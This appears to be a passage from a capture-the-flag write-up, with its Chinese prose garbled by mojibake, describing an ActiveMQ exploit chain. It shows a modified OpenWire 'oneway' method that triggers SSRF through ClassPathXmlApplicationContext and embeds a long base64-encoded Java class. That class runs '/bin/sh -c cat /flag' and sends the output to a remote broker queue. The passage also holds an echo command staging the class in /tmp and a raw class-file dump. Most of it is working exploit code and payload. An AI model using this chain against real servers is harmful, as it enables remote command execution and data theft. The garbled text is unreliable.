subSession = connection.createSession(false, Session.AUTO_ACKNOWLEDGE); Queue queue = subSession.createQueue(&quot;flagqueue&quot;); MessageConsumer subscriber = subSession.createConsumer(queue); subscriber.setMessageListener(this); connection.start(); &#125; public static void main(String[] args) throws Exception &#123; Main main = new Main(); main.publish(); &#125; @Override public void onMessage(Message message) &#123; try &#123; System.out.println(&quot;Received &quot; + ((TextMessage) message).getText()); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; é€šè¿‡è¿™ä¸ªæ–‡ä»¶è¯» flag, ä»æ–‡ä»¶ /flag è¯»å–å†…å®¹ï¼Œå¹¶å°†å…¶ä½œä¸ºæ–‡æœ¬æ¶ˆæ¯å‘é€åˆ°åä¸º â€œflagqueueâ€ çš„ ActiveMQ æ¶ˆæ¯é˜Ÿåˆ—ä¸­ã€‚è¿™ä½¿å¾—å…¶ä»–åº”ç”¨ç¨‹åºå¯ä»¥è®¢é˜… â€œflagqueueâ€ é˜Ÿåˆ—æ¥æ¥æ”¶æ¶ˆæ¯ã€‚ æ”¹ä¸€ä¸‹ oneway, é€šè¿‡è¿™ä¸ªå» SSRF çš„ GSON 1234567public void oneway(Object command) throws IOException &#123; this.checkStarted(); Throwable obj = new ClassPathXmlApplicationContext(&quot;http://127.0.0.1:8877/api/sun.print.PrintServiceLookupProvider/eyJscGNBbGxDb20iOlsieXY2NnZnQUFBRFFBd1FvQU1RQmRCd0JlQ0FCZkNnQUNBR0FMQUdFQVlnY0FZd3NBWkFCbENBQm1Dd0FHQUdjTEFBWUFhQWNBYVFnQWFnZ0Fhd2dBYkFjQWJRY0FiZ29BRUFCdkNnQVFBSEFLQUhFQWNnb0FEd0J6Q0FCMENnQVBBSFVLQUE4QWRnb0FDd0IzQ2dBTEFIZ0xBQVlBZVFzQUxBQjZDd0I3QUh3SkFIMEFmZ2dBZndvQWdBQ0JDd0JrQUlJSUFJTUxBQVlBaEFzQWhRQ0dDd0JrQUljSEFJZ0tBQ1VBWFFvQUpRQ0pCd0NLQ2dBb0FGMElBSXNLQUNnQWpBY0FqUXNBTEFDT0NnQW9BSThIQUpBS0FDOEFrUWNBa2djQWt3RUFCanhwYm1sMFBnRUFBeWdwVmdFQUJFTnZaR1VCQUE5TWFXNWxUblZ0WW1WeVZHRmliR1VCQUJKTWIyTmhiRlpoY21saFlteGxWR0ZpYkdVQkFBUjBhR2x6QVFBR1RFMWhhVzQ3QVFBSGNIVmliR2x6YUFFQUIyWmhZM1J2Y25rQkFCMU1hbUYyWVhndmFtMXpMME52Ym01bFkzUnBiMjVHWVdOMGIzSjVPd0VBQ21OdmJtNWxZM1JwYjI0QkFCWk1hbUYyWVhndmFtMXpMME52Ym01bFkzUnBiMjQ3QVFBS2NIVmlVMlZ6YzJsdmJnRUFFMHhxWVhaaGVDOXFiWE12VTJWemMybHZianNCQUFWeGRXVjFaUUVBRVV4cVlYWmhlQzlxYlhNdlVYVmxkV1U3QVFBSmNIVmliR2x6YUdWeUFRQWJUR3BoZG1GNEwycHRjeTlOWlhOellXZGxVSEp2WkhWalpYSTdBUUFEWTIxa0FRQVRXMHhxWVhaaEwyeGhibWN2VTNSeWFXNW5Pd0VBQW1KekFRQUNXMElCQUFkdFpYTnpZV2RsQVFBU1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0FRQURiWE5uQVFBWFRHcGhkbUY0TDJwdGN5OVVaWGgwVFdWemMyRm5aVHNCQUFwRmVHTmxjSFJwYjI1ekFRQUhZMjl1YzNWdFpRRUFDbk4xWWxObGMzTnBiMjRCQUFwemRXSnpZM0pwWW1WeUFRQWJUR3BoZG1GNEwycHRjeTlOWlhOellXZGxRMjl1YzNWdFpYSTdBUUFFYldGcGJnRUFGaWhiVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1ZZQkFBUmhjbWR6QVFBSmIyNU5aWE56WVdkbEFRQVdLRXhxWVhaaGVDOXFiWE12VFdWemMyRm5aVHNwVmdFQUFXVUJBQlZNYW1GMllTOXNZVzVuTDBWNFkyVndkR2x2YmpzQkFCTk1hbUYyWVhndmFtMXpMMDFsYzNOaFoyVTdBUUFOVTNSaFkydE5ZWEJVWVdKc1pRRUFDbE52ZFhKalpVWnBiR1VCQUFsTllXbHVMbXBoZG1FTUFETUFOQUVBTFc5eVp5OWhjR0ZqYUdVdllXTjBhWFpsYlhFdlFXTjBhWFpsVFZGRGIyNXVaV04wYVc5dVJtRmpkRzl5ZVFFQUZYUmpjRG92THpFeU55NHdMakF1TVRvMk1UWXhOZ3dBTXdDVUJ3Q1ZEQUNXQUpjQkFCRnFZWFpoZUM5cWJYTXZVMlZ6YzJsdmJnY0FtQXdBbVFDYUFRQUpabXhoWjNGMVpYVmxEQUNiQUp3TUFKMEFuZ0VBRUdwaGRtRXZiR0Z1Wnk5VGRISnBibWNCQUFjdlltbHVMM05vQVFBQ0xXTUJBQWxqWVhRZ0wyWnNZV2NCQUJGcVlYWmhMM1YwYVd3dlUyTmhibTVsY2dFQUdHcGhkbUV2YkdGdVp5OVFjbTlqWlhOelFuVnBiR1JsY2d3QU13QlREQUNmQUtBSEFLRU1BS0lBb3d3QU13Q2tBUUFDWEVFTUFLVUFwZ3dBcHdDb0RBQ3BBS29NQURNQXF3d0FyQUN0REFDdUFKUUhBSzhNQUxBQVZnY0FzUXdBc2dDekFRQVFjSFZpYkdsemFDQm1hVzVwYzJobFpBY0F0QXdBdFFDVURBQzJBRFFCQUE5MFkzQTZMeTk0ZUhnNk5qRTJNVFlNQUxjQXVBY0F1UXdBdWdDN0RBQ2ZBRFFCQUFSTllXbHVEQUE2QURRQkFCZHFZWFpoTDJ4aGJtY3ZVM1J5YVc1blFuVnBiR1JsY2dFQUNWSmxZMlZwZG1Wa0lBd0F2QUM5QVFBVmFtRjJZWGd2YW0xekwxUmxlSFJOWlhOellXZGxEQUMrQUtnTUFMOEFxQUVBRTJwaGRtRXZiR0Z1Wnk5RmVHTmxjSFJwYjI0TUFNQUFOQUVBRUdwaGRtRXZiR0Z1Wnk5UFltcGxZM1FCQUJscVlYWmhlQzlxYlhNdlRXVnpjMkZuWlV4cGMzUmxibVZ5QVFBVktFeHFZWFpoTDJ4aGJtY3ZVM1J5YVc1bk95bFdBUUFiYW1GMllYZ3ZhbTF6TDBOdmJtNWxZM1JwYjI1R1lXTjBiM0o1QVFBUVkzSmxZWFJsUTI5dWJtVmpkR2x2YmdFQUdDZ3BUR3BoZG1GNEwycHRjeTlEYjI1dVpXTjBhVzl1T3dFQUZHcGhkbUY0TDJwdGN5OURiMjV1WldOMGFXOXVBUUFOWTNKbFlYUmxVMlZ6YzJsdmJnRUFGeWhhU1NsTWFtRjJZWGd2YW0xekwxTmxjM05wYjI0N0FRQUxZM0psWVhSbFVYVmxkV1VCQUNVb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoZUM5cWJYTXZVWFZsZFdVN0FRQU9ZM0psWVhSbFVISnZaSFZqWlhJQkFEUW9UR3BoZG1GNEwycHRjeTlFWlhOMGFXNWhkR2x2YmpzcFRHcGhkbUY0TDJwdGN5OU5aWE56WVdkbFVISnZaSFZqWlhJN0FRQUZjM1JoY25RQkFCVW9LVXhxWVhaaEwyeGhibWN2VUhKdlkyVnpjenNCQUJGcVlYWmhMMnhoYm1jdlVISnZZMlZ6Y3dFQURtZGxkRWx1Y0hWMFUzUnlaV0Z0QVFBWEtDbE1hbUYyWVM5cGJ5OUpibkIxZEZOMGNtVmhiVHNCQUJnb1RHcGhkbUV2YVc4dlNXNXdkWFJUZEhKbFlXMDdLVllCQUF4MWMyVkVaV3hwYldsMFpYSUJBQ2NvVEdwaGRtRXZiR0Z1Wnk5VGRISnBibWM3S1V4cVlYWmhMM1YwYVd3dlUyTmhibTVsY2pzQkFBUnVaWGgwQVFBVUtDbE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c0JBQWhuWlhSQ2VYUmxjd0VBQkNncFcwSUJBQVVvVzBJcFZnRUFFV055WldGMFpWUmxlSFJOWlhOellXZGxBUUFaS0NsTWFtRjJZWGd2YW0xekwxUmxlSFJOWlhOellXZGxPd0VBQjNObGRGUmxlSFFCQUJscVlYWmhlQzlxYlhNdlRXVnpjMkZuWlZCeWIyUjFZMlZ5QVFBRWMyVnVaQUVBRUdwaGRtRXZiR0Z1Wnk5VGVYTjBaVzBCQUFOdmRYUUJBQlZNYW1GMllTOXBieTlRY21sdWRGTjBjbVZoYlRzQkFCTnFZWFpoTDJsdkwxQnlhVzUwVTNSeVpXRnRBUUFIY0hKcGJuUnNiZ0VBQldOc2IzTmxBUUFPWTNKbFlYUmxRMjl1YzNWdFpYSUJBRFFvVEdwaGRtRjRMMnB0Y3k5RVpYTjBhVzVoZEdsdmJqc3BUR3BoZG1GNEwycHRjeTlOWlhOellXZGxRMjl1YzNWdFpYSTdBUUFaYW1GMllYZ3ZhbTF6TDAxbGMzTmhaMlZEYjI1emRXMWxjZ0VBRW5ObGRFMWxjM05oWjJWTWFYTjBaVzVsY2dFQUhpaE1hbUYyWVhndmFtMXpMMDFsYzNOaFoyVk1hWE4wWlc1bGNqc3BWZ0VBQm1Gd2NHVnVaQUVBTFNoTWFtRjJZUzlzWVc1bkwxTjBjbWx1WnpzcFRHcGhkbUV2YkdGdVp5OVRkSEpwYm1kQ2RXbHNaR1Z5T3dFQUIyZGxkRlJsZUhRQkFBaDBiMU4wY21sdVp3RUFEM0J5YVc1MFUzUmhZMnRVY21GalpRQWhBQ1VBTVFBQkFESUFBQUFGQUFFQU13QTBBQUVBTlFBQUFDOEFBUUFCQUFBQUJTcTNBQUd4QUFBQUFnQTJBQUFBQmdBQkFBQUFCUUEzQUFBQURBQUJBQUFBQlFBNEFEa0FBQUFDQURvQU5BQUNBRFVBQUFGZUFBVUFDZ0FBQUpxN0FBSlpFZ08zQUFSTUs3a0FCUUVBVFN3REJMa0FCd01BVGkwU0NMa0FDUUlBT2dRdEdRUzVBQW9DQURvRkJyMEFDMWtERWd4VFdRUVNEVk5aQlJJT1V6b0d1d0FQV2JzQUVGa1pCcmNBRWJZQUVyWUFFN2NBRkJJVnRnQVd0Z0FYdGdBWU9nZTdBQXRaR1FlM0FCazZDQzI1QUJvQkFEb0pHUWtaQ0xrQUd3SUFHUVVaQ2JrQUhBSUFzZ0FkRWg2MkFCOHN1UUFnQVFDeEFBQUFBZ0EyQUFBQVJnQVJBQUFBQ0FBS0FBa0FFUUFLQUJvQUN3QWtBQXdBTGdBTkFFTUFEZ0JiQUE4QVhnQVFBR0VBRVFCbUFCSUFjUUFUQUhrQUZBQ0NBQlVBaXdBV0FKTUFGd0NaQUJnQU53QUFBR1lBQ2dBQUFKb0FPQUE1QUFBQUNnQ1FBRHNBUEFBQkFCRUFpUUE5QUQ0QUFnQWFBSUFBUHdCQUFBTUFKQUIyQUVFQVFnQUVBQzRBYkFCREFFUUFCUUJEQUZjQVJRQkdBQVlBWmdBMEFFY0FTQUFIQUhFQUtRQkpBRW9BQ0FCNUFDRUFTd0JNQUFrQVRRQUFBQVFBQVFBdkFBSUFUZ0EwQUFJQU5RQUFBTFVBQXdBR0FBQUFQYnNBQWxrU0liY0FCRXdydVFBRkFRQk5MQU1FdVFBSEF3Qk9MUklJdVFBSkFnQTZCQzBaQkxrQUlnSUFPZ1VaQlNxNUFDTUNBQ3k1QUNRQkFMRUFBQUFDQURZQUFBQWlBQWdBQUFBYkFBb0FIQUFSQUIwQUdnQWVBQ1FBSHdBdUFDQUFOZ0FoQUR3QUlnQTNBQUFBUGdBR0FBQUFQUUE0QURrQUFBQUtBRE1BT3dBOEFBRUFFUUFzQUQwQVBnQUNBQm9BSXdCUEFFQUFBd0FrQUJrQVFRQkNBQVFBTGdBUEFGQUFVUUFGQUUwQUFBQUVBQUVBTHdBSkFGSUFVd0FDQURVQUFBQkpBQUlBQWdBQUFBMjdBQ1ZadHdBbVRDdTNBQ2V4QUFBQUFnQTJBQUFBRGdBREFBQUFKZ0FJQUNjQURBQW9BRGNBQUFBV0FBSUFBQUFOQUZRQVJnQUFBQWdBQlFCU0FEa0FBUUJOQUFBQUJBQUJBQzhBQVFCVkFGWUFBUUExQUFBQWpRQURBQU1BQUFBcXNnQWR1d0FvV2JjQUtSSXF0Z0FySzhBQUxMa0FMUUVBdGdBcnRnQXV0Z0FmcHdBSVRTeTJBREN4QUFFQUFBQWhBQ1FBTHdBREFEWUFBQUFXQUFVQUFBQXRBQ0VBTUFBa0FDNEFKUUF2QUNrQU1RQTNBQUFBSUFBREFDVUFCQUJYQUZnQUFnQUFBQ29BT0FBNUFBQUFBQUFxQUVrQVdRQUJBRm9BQUFBSEFBSmtCd0F2QkFBQkFGc0FBQUFDQUZ3PSIsInl2NjZ2Z0FBQURRQXdRb0FNUUJkQndCZUNBQmZDZ0FDQUdBTEFHRUFZZ2NBWXdzQVpBQmxDQUJtQ3dBR0FHY0xBQVlBYUFjQWFRZ0FhZ2dBYXdnQWJBY0FiUWNBYmdvQUVBQnZDZ0FRQUhBS0FIRUFjZ29BRHdCekNBQjBDZ0FQQUhVS0FBOEFkZ29BQ3dCM0NnQUxBSGdMQUFZQWVRc0FMQUI2Q3dCN0FId0pBSDBBZmdnQWZ3b0FnQUNCQ3dCa0FJSUlBSU1MQUFZQWhBc0FoUUNHQ3dCa0FJY0hBSWdLQUNVQVhRb0FKUUNKQndDS0NnQW9BRjBJQUlzS0FDZ0FqQWNBalFzQUxBQ09DZ0FvQUk4SEFKQUtBQzhBa1FjQWtnY0Frd0VBQmp4cGJtbDBQZ0VBQXlncFZnRUFCRU52WkdVQkFBOU1hVzVsVG5WdFltVnlWR0ZpYkdVQkFCSk1iMk5oYkZaaGNtbGhZbXhsVkdGaWJHVUJBQVIwYUdsekFRQUdURTFoYVc0N0FRQUhjSFZpYkdsemFBRUFCMlpoWTNSdmNua0JBQjFNYW1GMllYZ3ZhbTF6TDBOdmJtNWxZM1JwYjI1R1lXTjBiM0o1T3dFQUNtTnZibTVsWTNScGIyNEJBQlpNYW1GMllYZ3ZhbTF6TDBOdmJtNWxZM1JwYjI0N0FRQUtjSFZpVTJWemMybHZiZ0VBRTB4cVlYWmhlQzlxYlhNdlUyVnpjMmx2YmpzQkFBVnhkV1YxWlFFQUVVeHFZWFpoZUM5cWJYTXZVWFZsZFdVN0FRQUpjSFZpYkdsemFHVnlBUUFiVEdwaGRtRjRMMnB0Y3k5TlpYTnpZV2RsVUhKdlpIVmpaWEk3QVFBRFkyMWtBUUFUVzB4cVlYWmhMMnhoYm1jdlUzUnlhVzVuT3dFQUFtSnpBUUFDVzBJQkFBZHRaWE56WVdkbEFRQVNUR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdBUUFEYlhObkFRQVhUR3BoZG1GNEwycHRjeTlVWlhoMFRXVnpjMkZuWlRzQkFBcEZlR05sY0hScGIyNXpBUUFIWTI5dWMzVnRaUUVBQ25OMVlsTmxjM05wYjI0QkFBcHpkV0p6WTNKcFltVnlBUUFiVEdwaGRtRjRMMnB0Y3k5TlpYTnpZV2RsUTI5dWMzVnRaWEk3QVFBRWJXRnBiZ0VBRmloYlRHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tWWUJBQVJoY21kekFRQUpiMjVOWlhOellXZGxBUUFXS0V4cVlYWmhlQzlxYlhNdlRXVnpjMkZuWlRzcFZnRUFBV1VCQUJWTWFtRjJZUzlzWVc1bkwwVjRZMlZ3ZEdsdmJqc0JBQk5NYW1GMllYZ3ZhbTF6TDAxbGMzTmhaMlU3QVFBTlUzUmhZMnROWVhCVVlXSnNaUUVBQ2xOdmRYSmpaVVpwYkdVQkFBbE5ZV2x1TG1waGRtRU1BRE1BTkFFQUxXOXlaeTloY0dGamFHVXZZV04wYVhabGJYRXZRV04wYVhabFRWRkRiMjV1WldOMGFXOXVSbUZqZEc5eWVRRUFGWFJqY0Rvdkx6RXlOeTR3TGpBdU1UbzJNVFl4Tmd3QU13Q1VCd0NWREFDV0FKY0JBQkZxWVhaaGVDOXFiWE12VTJWemMybHZiZ2NBbUF3QW1RQ2FBUUFKWm14aFozRjFaWFZsREFDYkFKd01BSjBBbmdFQUVHcGhkbUV2YkdGdVp5OVRkSEpwYm1jQkFBY3ZZbWx1TDNOb0FRQUNMV01CQUFsallYUWdMMlpzWVdjQkFCRnFZWFpoTDNWMGFXd3ZVMk5oYm01bGNnRUFHR3BoZG1FdmJHRnVaeTlRY205alpYTnpRblZwYkdSbGNnd0FNd0JUREFDZkFLQUhBS0VNQUtJQW93d0FNd0NrQVFBQ1hFRU1BS1VBcGd3QXB3Q29EQUNwQUtvTUFETUFxd3dBckFDdERBQ3VBSlFIQUs4TUFMQUFWZ2NBc1F3QXNnQ3pBUUFRY0hWaWJHbHphQ0JtYVc1cGMyaGxaQWNBdEF3QXRRQ1VEQUMyQURRQkFBOTBZM0E2THk5NGVIZzZOakUyTVRZTUFMY0F1QWNBdVF3QXVnQzdEQUNmQURRQkFBUk5ZV2x1REFBNkFEUUJBQmRxWVhaaEwyeGhibWN2VTNSeWFXNW5RblZwYkdSbGNnRUFDVkpsWTJWcGRtVmtJQXdBdkFDOUFRQVZhbUYyWVhndmFtMXpMMVJsZUhSTlpYTnpZV2RsREFDK0FLZ01BTDhBcUFFQUUycGhkbUV2YkdGdVp5OUZlR05sY0hScGIyNE1BTUFBTkFFQUVHcGhkbUV2YkdGdVp5OVBZbXBsWTNRQkFCbHFZWFpoZUM5cWJYTXZUV1Z6YzJGblpVeHBjM1JsYm1WeUFRQVZLRXhxWVhaaEwyeGhibWN2VTNSeWFXNW5PeWxXQVFBYmFtRjJZWGd2YW0xekwwTnZibTVsWTNScGIyNUdZV04wYjNKNUFRQVFZM0psWVhSbFEyOXVibVZqZEdsdmJnRUFHQ2dwVEdwaGRtRjRMMnB0Y3k5RGIyNXVaV04wYVc5dU93RUFGR3BoZG1GNEwycHRjeTlEYjI1dVpXTjBhVzl1QVFBTlkzSmxZWFJsVTJWemMybHZiZ0VBRnloYVNTbE1hbUYyWVhndmFtMXpMMU5sYzNOcGIyNDdBUUFMWTNKbFlYUmxVWFZsZFdVQkFDVW9UR3BoZG1FdmJHRnVaeTlUZEhKcGJtYzdLVXhxWVhaaGVDOXFiWE12VVhWbGRXVTdBUUFPWTNKbFlYUmxVSEp2WkhWalpYSUJBRFFvVEdwaGRtRjRMMnB0Y3k5RVpYTjBhVzVoZEdsdmJqc3BUR3BoZG1GNEwycHRjeTlOWlhOellXZGxVSEp2WkhWalpYSTdBUUFGYzNSaGNuUUJBQlVvS1V4cVlYWmhMMnhoYm1jdlVISnZZMlZ6Y3pzQkFCRnFZWFpoTDJ4aGJtY3ZVSEp2WTJWemN3RUFEbWRsZEVsdWNIVjBVM1J5WldGdEFRQVhLQ2xNYW1GMllTOXBieTlKYm5CMWRGTjBjbVZoYlRzQkFCZ29UR3BoZG1FdmFXOHZTVzV3ZFhSVGRISmxZVzA3S1ZZQkFBeDFjMlZFWld4cGJXbDBaWElCQUNjb1RHcGhkbUV2YkdGdVp5OVRkSEpwYm1jN0tVeHFZWFpoTDNWMGFXd3ZVMk5oYm01bGNqc0JBQVJ1WlhoMEFRQVVLQ2xNYW1GMllTOXNZVzVuTDFOMGNtbHVaenNCQUFoblpYUkNlWFJsY3dFQUJDZ3BXMElCQUFVb1cwSXBWZ0VBRVdOeVpXRjBaVlJsZUhSTlpYTnpZV2RsQVFBWktDbE1hbUYyWVhndmFtMXpMMVJsZUhSTlpYTnpZV2RsT3dFQUIzTmxkRlJsZUhRQkFCbHFZWFpoZUM5cWJYTXZUV1Z6YzJGblpWQnliMlIxWTJWeUFRQUVjMlZ1WkFFQUVHcGhkbUV2YkdGdVp5OVRlWE4wWlcwQkFBTnZkWFFCQUJWTWFtRjJZUzlwYnk5UWNtbHVkRk4wY21WaGJUc0JBQk5xWVhaaEwybHZMMUJ5YVc1MFUzUnlaV0Z0QVFBSGNISnBiblJzYmdFQUJXTnNiM05sQVFBT1kzSmxZWFJsUTI5dWMzVnRaWElCQURRb1RHcGhkbUY0TDJwdGN5OUVaWE4wYVc1aGRHbHZianNwVEdwaGRtRjRMMnB0Y3k5TlpYTnpZV2RsUTI5dWMzVnRaWEk3QVFBWmFtRjJZWGd2YW0xekwwMWxjM05oWjJWRGIyNXpkVzFsY2dFQUVuTmxkRTFsYzNOaFoyVk1hWE4wWlc1bGNnRUFIaWhNYW1GMllYZ3ZhbTF6TDAxbGMzTmhaMlZNYVhOMFpXNWxjanNwVmdFQUJtRndjR1Z1WkFFQUxTaE1hbUYyWVM5c1lXNW5MMU4wY21sdVp6c3BUR3BoZG1FdmJHRnVaeTlUZEhKcGJtZENkV2xzWkdWeU93RUFCMmRsZEZSbGVIUUJBQWgwYjFOMGNtbHVad0VBRDNCeWFXNTBVM1JoWTJ0VWNtRmpaUUFoQUNVQU1RQUJBRElBQUFBRkFBRUFNd0EwQUFFQU5RQUFBQzhBQVFBQkFBQUFCU3EzQUFHeEFBQUFBZ0EyQUFBQUJnQUJBQUFBQlFBM0FBQUFEQUFCQUFBQUJRQTRBRGtBQUFBQ0FEb0FOQUFDQURVQUFBRmVBQVVBQ2dBQUFKcTdBQUpaRWdPM0FBUk1LN2tBQlFFQVRTd0RCTGtBQndNQVRpMFNDTGtBQ1FJQU9nUXRHUVM1QUFvQ0FEb0ZCcjBBQzFrREVneFRXUVFTRFZOWkJSSU9Vem9HdXdBUFdic0FFRmtaQnJjQUViWUFFcllBRTdjQUZCSVZ0Z0FXdGdBWHRnQVlPZ2U3QUF0WkdRZTNBQms2Q0MyNUFCb0JBRG9KR1FrWkNMa0FHd0lBR1FVWkNia0FIQUlBc2dBZEVoNjJBQjhzdVFBZ0FRQ3hBQUFBQWdBMkFBQUFSZ0FSQUFBQUNBQUtBQWtBRVFBS0FCb0FDd0FrQUF3QUxnQU5BRU1BRGdCYkFBOEFYZ0FRQUdFQUVRQm1BQklBY1FBVEFIa0FGQUNDQUJVQWl3QVdBSk1BRndDWkFCZ0FOd0FBQUdZQUNnQUFBSm9BT0FBNUFBQUFDZ0NRQURzQVBBQUJBQkVBaVFBOUFENEFBZ0FhQUlBQVB3QkFBQU1BSkFCMkFFRUFRZ0FFQUM0QWJBQkRBRVFBQlFCREFGY0FSUUJHQUFZQVpnQTBBRWNBU0FBSEFIRUFLUUJKQUVvQUNBQjVBQ0VBU3dCTUFBa0FUUUFBQUFRQUFRQXZBQUlBVGdBMEFBSUFOUUFBQUxVQUF3QUdBQUFBUGJzQUFsa1NJYmNBQkV3cnVRQUZBUUJOTEFNRXVRQUhBd0JPTFJJSXVRQUpBZ0E2QkMwWkJMa0FJZ0lBT2dVWkJTcTVBQ01DQUN5NUFDUUJBTEVBQUFBQ0FEWUFBQUFpQUFnQUFBQWJBQW9BSEFBUkFCMEFHZ0FlQUNRQUh3QXVBQ0FBTmdBaEFEd0FJZ0EzQUFBQVBnQUdBQUFBUFFBNEFEa0FBQUFLQURNQU93QThBQUVBRVFBc0FEMEFQZ0FDQUJvQUl3QlBBRUFBQXdBa0FCa0FRUUJDQUFRQUxnQVBBRkFBVVFBRkFFMEFBQUFFQUFFQUx3QUpBRklBVXdBQ0FEVUFBQUJKQUFJQUFnQUFBQTI3QUNWWnR3QW1UQ3UzQUNleEFBQUFBZ0EyQUFBQURnQURBQUFBSmdBSUFDY0FEQUFvQURjQUFBQVdBQUlBQUFBTkFGUUFSZ0FBQUFnQUJRQlNBRGtBQVFCTkFBQUFCQUFCQUM4QUFRQlZBRllBQVFBMUFBQUFqUUFEQUFNQUFBQXFzZ0FkdXdBb1diY0FLUklxdGdBcks4QUFMTGtBTFFFQXRnQXJ0Z0F1dGdBZnB3QUlUU3kyQURDeEFBRUFBQUFoQUNRQUx3QURBRFlBQUFBV0FBVUFBQUF0QUNFQU1BQWtBQzRBSlFBdkFDa0FNUUEzQUFBQUlBQURBQ1VBQkFCWEFGZ0FBZ0FBQUNvQU9BQTVBQUFBQUFBcUFFa0FXUUFCQUZvQUFBQUhBQUprQndBdkJBQUJBRnNBQUFBQ0FGdz0iXX0=&quot;); ExceptionResponse response = new ExceptionResponse(obj); this.wireFormat.marshal(response, this.dataOut); this.dataOut.flush();&#125; 1echo ç¼–è¯‘å¥½çš„classçš„base64 &gt; /tmp/nmlgb.txt 1&#123;&quot;lpcAllCom&quot;:[&quot;cmd&quot;,&quot;cmd&quot;]&#125; 1yv66vgAAADQAwQoAMQBdBwBeCABfCgACAGALAGEAYgcAYwsAZABlCABmCwAGAGcLAAYAaAcAaQgAaggAawgAbAcAbQcAbgoAEABvCgAQAHAKAHEAcgoADwBzCAB0CgAPAHUKAA8AdgoACwB3CgALAHgLAAYAeQsALAB6CwB7AHwJAH0AfggAfwoAgACBCwBkAIIIAIMLAAYAhAsAhQCGCwBkAIcHAIgKACUAXQoAJQCJBwCKCgAoAF0IAIsKACgAjAcAjQsALACOCgAoAI8HAJAKAC8AkQcAkgcAkwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAGTE1haW47AQAHcHVibGlzaAEAB2ZhY3RvcnkBAB1MamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5OwEACmNvbm5lY3Rpb24BABZMamF2YXgvam1zL0Nvbm5lY3Rpb247AQAKcHViU2Vzc2lvbgEAE0xqYXZheC9qbXMvU2Vzc2lvbjsBAAVxdWV1ZQEAEUxqYXZheC9qbXMvUXVldWU7AQAJcHVibGlzaGVyAQAbTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQADY21kAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAmJzAQACW0IBAAdtZXNzYWdlAQASTGphdmEvbGFuZy9TdHJpbmc7AQADbXNnAQAXTGphdmF4L2ptcy9UZXh0TWVzc2FnZTsBAApFeGNlcHRpb25zAQAHY29uc3VtZQEACnN1YlNlc3Npb24BAApzdWJzY3JpYmVyAQAbTGphdmF4L2ptcy9NZXNzYWdlQ29uc3VtZXI7AQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQAJb25NZXNzYWdlAQAWKExqYXZheC9qbXMvTWVzc2FnZTspVgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBABNMamF2YXgvam1zL01lc3NhZ2U7AQANU3RhY2tNYXBUYWJsZQEAClNvdXJjZUZpbGUBAAlNYWluLmphdmEMADMANAEALW9yZy9hcGFjaGUvYWN0aXZlbXEvQWN0aXZlTVFDb25uZWN0aW9uRmFjdG9yeQEAFXRjcDovLzEyNy4wLjAuMTo2MTYxNgwAMwCUBwCVDACWAJcBABFqYXZheC9qbXMvU2Vzc2lvbgcAmAwAmQCaAQAJZmxhZ3F1ZXVlDACbAJwMAJ0AngEAEGphdmEvbGFuZy9TdHJpbmcBAAcvYmluL3NoAQACLWMBAAljYXQgL2ZsYWcBABFqYXZhL3V0aWwvU2Nhbm5lcgEAGGphdmEvbGFuZy9Qcm9jZXNzQnVpbGRlcgwAMwBTDACfAKAHAKEMAKIAowwAMwCkAQACXEEMAKUApgwApwCoDACpAKoMADMAqwwArACtDACuAJQHAK8MALAAVgcAsQwAsgCzAQAQcHVibGlzaCBmaW5pc2hlZAcAtAwAtQCUDAC2ADQBAA90Y3A6Ly94eHg6NjE2MTYMALcAuAcAuQwAugC7DACfADQBAARNYWluDAA6ADQBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEACVJlY2VpdmVkIAwAvAC9AQAVamF2YXgvam1zL1RleHRNZXNzYWdlDAC+AKgMAL8AqAEAE2phdmEvbGFuZy9FeGNlcHRpb24MAMAANAEAEGphdmEvbGFuZy9PYmplY3QBABlqYXZheC9qbXMvTWVzc2FnZUxpc3RlbmVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAbamF2YXgvam1zL0Nvbm5lY3Rpb25GYWN0b3J5AQAQY3JlYXRlQ29ubmVjdGlvbgEAGCgpTGphdmF4L2ptcy9Db25uZWN0aW9uOwEAFGphdmF4L2ptcy9Db25uZWN0aW9uAQANY3JlYXRlU2Vzc2lvbgEAFyhaSSlMamF2YXgvam1zL1Nlc3Npb247AQALY3JlYXRlUXVldWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9qbXMvUXVldWU7AQAOY3JlYXRlUHJvZHVjZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2ptcy9NZXNzYWdlUHJvZHVjZXI7AQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhnZXRCeXRlcwEABCgpW0IBAAUoW0IpVgEAEWNyZWF0ZVRleHRNZXNzYWdlAQAZKClMamF2YXgvam1zL1RleHRNZXNzYWdlOwEAB3NldFRleHQBABlqYXZheC9qbXMvTWVzc2FnZVByb2R1Y2VyAQAEc2VuZAEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEABWNsb3NlAQAOY3JlYXRlQ29uc3VtZXIBADQoTGphdmF4L2ptcy9EZXN0aW5hdGlvbjspTGphdmF4L2pt